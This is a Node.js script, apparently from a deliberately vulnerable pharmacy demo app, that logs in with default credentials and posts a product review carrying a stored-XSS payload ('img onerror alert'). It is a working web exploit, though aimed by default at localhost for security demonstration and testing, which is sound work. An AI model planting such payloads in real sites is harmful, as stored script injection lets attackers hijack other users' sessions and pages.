#!/usr/bin/env node

const baseUrl = (process.env.IWA_BASE_URL ?? 'http://localhost:8888').replace(/\/$/, '');
const username = process.env.IWA_USERNAME ?? 'user1';
const password = process.env.IWA_PASSWORD ?? 'Password123!';
const defaultComment = "<img src=x onerror=alert('StoredXSS')>";

function option(name, fallback) {
  const index = process.argv.indexOf(`--${name}`);
  return index >= 0 ? process.argv[index + 1] ?? fallback : fallback;
}

if (process.argv.includes('--help') || process.argv.includes('-h')) {
  console.log(`Create a stored-XSS review in IWA Pharmacy Direct.

Usage:
  node bin/create-stored-xss-review.mjs [options]

Options:
  --base-url URL   Application URL (default: IWA_BASE_URL or http://localhost:8888)
  --username NAME  Login username (default: IWA_USERNAME or user1)
  --password PASS  Login password (default: IWA_PASSWORD or Password123!)
  --product-id ID  Product ID (default: first product returned by the API)
  --comment HTML   Review payload (default: image onerror demo payload)
  --rating NUMBER  Review rating (default: 5)

Environment variables use the same names as the corresponding defaults.
`);
  process.exit(0);
}

const configuredBaseUrl = option('base-url', baseUrl).replace(/\/$/, '');
const configuredUsername = option('username', username);
const configuredPassword = option('password', password);
const configuredComment = option('comment', defaultComment);
const configuredRating = Number(option('rating', '5'));

async function request(path, init = {}) {
  const url = `${configuredBaseUrl}${path}`;
  let response;
  try {
    response = await fetch(url, {
      ...init,
      headers: {
        Accept: 'application/json',
        ...(init.body ? { 'Content-Type': 'application/json' } : {}),
        ...(init.headers ?? {}),
      },
    });
  } catch (error) {
    const cause = error?.cause?.code ? ` (${error.cause.code})` : '';
    throw new Error(`Could not reach ${url}${cause}. Start the app or check --base-url.`);
  }
  const payload = await response.json().catch(() => ({}));
  if (!response.ok || payload.status === 'error') {
    throw new Error(`${response.status} ${payload.message ?? response.statusText}`);
  }
  return payload.data;
}

try {
  const signIn = await request('/api/v3/site/sign-in', {
    method: 'POST',
    body: JSON.stringify({ username: configuredUsername, password: configuredPassword }),
  });

  const products = await request('/api/v3/products');
  const productId = option('product-id', products.rows?.[0]?.id);
  if (!productId) throw new Error('No product was returned. Supply --product-id explicitly.');
  if (!Number.isInteger(configuredRating) || configuredRating < 1 || configuredRating > 5) {
    throw new Error('--rating must be an integer from 1 to 5.');
  }

  const review = await request('/api/v3/reviews', {
    method: 'POST',
    headers: { Authorization: `Bearer ${signIn.token}` },
    body: JSON.stringify({
      productId,
      comment: configuredComment,
      rating: configuredRating,
    }),
  });

  console.log(`Created review ${review.id ?? '(id unavailable)'} for product ${productId}.`);
  console.log(`Open /app/products/${productId} or /app/user/reviews to view the stored payload.`);
} catch (error) {
  console.error(`Unable to create stored-XSS review: ${error.message}`);
  process.exitCode = 1;
}
